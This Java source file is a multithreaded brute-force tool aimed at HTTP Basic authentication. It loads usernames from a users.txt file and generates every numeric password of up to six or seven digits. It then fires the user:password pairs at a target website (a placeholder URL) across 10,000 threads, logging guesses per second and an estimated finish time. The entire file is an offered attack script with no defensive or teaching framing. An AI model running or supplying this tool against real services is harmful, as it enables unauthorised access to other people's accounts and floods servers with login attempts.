import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Date;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Calendar;
import java.util.Scanner;

public class Main
{
    private static final int MAX_LIST_LENGTH = 6, THREADS_NUMBER = 10000;
    private static final String WEBSITE = "http://example.com";
    private static final String CHARS = "0123456789";
    /*
     * !"~$%&'()*+,-./:;<=>?@[\]^_`{|}~
     * ABCDEFGHIJKLMNOPQRSTUVWXYZ
     * abcdefghijklmnopqrstuvwxyz
     * 0123456789
     */
    private static ArrayList<String> urls = new ArrayList<String>();
    private static ArrayList<String> users = new ArrayList<String>();

    private static void recursiveSearch(String urlStr, int index, int listLength)
    {
        if(index > listLength)
        {
            urls.add(urlStr);
        }
        else
        {
            for(int charIndex = 0; charIndex < CHARS.length(); charIndex++)
                recursiveSearch(urlStr + CHARS.charAt(charIndex), index + 1, listLength);
        }
    }

    static long lastUrlsSize = 0;

    private static double globalSpeed()
    {
        return 1000 * (double)(urlsInitSize - urls.size()) / (double)(Calendar.getInstance().getTimeInMillis() - newTime);
    }

    private static int estimate()
    {
        return (int)(Math.pow(CHARS.length() + 1, MAX_LIST_LENGTH)); // counts things like: " a " (which are normaly impossible)
    }

    private static double estimateEnd()
    {
        return 1000.0 * urls.size() / globalSpeed();
    }

    private static String estimeEndDate()
    {
        return new Date((long)(Calendar.getInstance().getTimeInMillis() + estimateEnd())).toLocaleString();
    }

    private static String withSpaces(double l)
    {
        DecimalFormat formatter = new DecimalFormat("#,###");
        return formatter.format(l);
    }

    private static void forFunction(int userIndex)
    {
        String user = users.get(userIndex);
        System.out.println("WORKING ON: " + user + " " + userIndex + " / " + users.size());

         long time = Calendar.getInstance().getTimeInMillis();
        /// System.out.println("Start enumerating something like: " + estimate() + " ...");
        urlsInitSize = urls.size();
        lastUrlsSize = urlsInitSize;
         newTime = Calendar.getInstance().getTimeInMillis();
        /// System.out.println("Ended in: " + (newTime - time) + " ms !");

        for(int threadIndex = 0; threadIndex < THREADS_NUMBER; threadIndex++)
        {
            Thread th = new Thread()
            {
                public void run()
                {
                    URL url = null;

                    try
                    {
                        url = new URL(WEBSITE);
                    }
                    catch(Exception e)
                    {}

                    while(true)
                    {
                        try
                        {
                            String urlStr = urls.remove(0);

                            String authStringEnc = new String(Base64.getEncoder().encode((user + ":" + urlStr).getBytes()));
                            HttpURLConnection HttpurlConnection = (HttpURLConnection)url.openConnection();
                            HttpurlConnection.setRequestProperty("Authorization", "Basic " + authStringEnc);

                            // System.out.println(urlStr);
                            HttpurlConnection.getInputStream();
                            System.out.println(urlStr + " done in: " + (Calendar.getInstance().getTimeInMillis() - newTime) + " ms !");

                            break;
                            // System.exit(0);
                        }
                        catch(Exception e)
                        {}
                    }
                }
            };
            th.start();
        }

        while(true)
        {
            if(urls.isEmpty())
            {
                System.out.println("OUT !");
                return;
                // System.exit(0);
            }
            if(true)
            {
                System.out.println(withSpaces(Calendar.getInstance().getTimeInMillis() - newTime) + " " + withSpaces(urls.size()) + " / " + withSpaces(urlsInitSize));
                System.out.println("Global speed: " + withSpaces(globalSpeed()) + " tests/s");
                System.out.println("Estimated end: " + estimeEndDate());
                System.out.println("Just done in a second: " + (lastUrlsSize - urls.size()) + "\n");
            }
            lastUrlsSize = urls.size();
            try
            {
                Thread.sleep(1000);
            }
            catch(InterruptedException e)
            {
                e.printStackTrace();
            }

        }
    }

    static long newTime = 0, urlsInitSize = 0;

    public static void main(String[] args)
    {
        File usersFile = new File("users.txt");
        if(usersFile.exists())
            try
            {
                Scanner scan = new Scanner(usersFile);
                while(scan.hasNextLine())
                {
                    String nextLine = scan.nextLine();
                    users.add(nextLine);
                }
                scan.close();
            }
            catch(Exception e)
            {}

        for(int listLength = 0; listLength < MAX_LIST_LENGTH; listLength++)
            recursiveSearch("", 0, listLength);
        int usersSize = users.size();
        for(int userIndex = 0; userIndex < usersSize; userIndex++)
        {
            forFunction(userIndex);
        }
    }
}